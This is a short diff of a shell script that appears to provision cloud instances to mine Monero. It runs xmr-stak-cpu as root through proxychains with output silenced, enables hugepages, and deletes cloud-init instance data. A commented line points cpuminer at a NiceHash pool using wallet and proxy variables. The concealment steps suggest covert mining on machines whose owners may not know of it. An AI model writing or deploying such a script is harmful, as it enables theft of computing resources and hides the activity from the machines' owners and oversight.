@@ -7,7 +7,7 @@ sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4
 #ln -s /usr/include/curl curl
 #git checkout linux
 #sudo CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
-#sudo sysctl -w vm.nr_hugepages=128
+sudo sysctl -w vm.nr_hugepages=128
 #sudo ./build.sh
 rm -rf /var/lib/cloud/instance/*
 
@@ -15,10 +15,8 @@ sudo chmod +x /m/test01/proxychains/proxychains4
 sudo chmod +x /m/test01/xmr/xmr-stak-cpu
 sudo chmod +x /m/test01/proxychains/libproxychains4.so
 
-while true; do
-cd /m/test01/xmr
-  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-done
+sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
+sudo reboot
 
 #while true; do
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
